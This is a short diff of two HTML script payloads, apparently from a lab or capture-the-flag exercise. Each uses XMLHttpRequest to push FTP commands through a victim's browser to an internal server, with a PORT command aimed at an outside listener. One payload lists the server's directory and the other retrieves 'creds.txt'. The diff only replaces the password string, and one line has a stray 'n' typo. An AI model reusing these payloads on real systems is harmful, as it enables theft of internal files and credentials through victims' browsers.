@@ -9,7 +9,7 @@ xhr.onreadystatechange = function() {
     if (this.readyState === XMLHttpRequest.DONE &&
 this.status === 200) {
 } }
-xhr.send("USER ftp_user\r\nPASS Secret12345\r\nPORT
+xhr.send("USER ftp_user\r\nPASS SUPERSECRETS\r\nPORT
 10,10,16,19,209,205\r\nLIST\r\n");
 </script>
 
@@ -26,6 +26,6 @@ xhr.onreadystatechange = function() {
     if (this.readyState === XMLHttpRequest.DONE &&
 this.status === 200) {
 } }
-xhr.send("USER ftp_user\r\nPASS Secret12345\r\nPORT
+xhr.send("USER ftp_user\r\nPASS SUPERSECRETS\r\nPORT
 10,10,16,19,209,205\r\nnRETR creds.txt\r\n");
 </script>
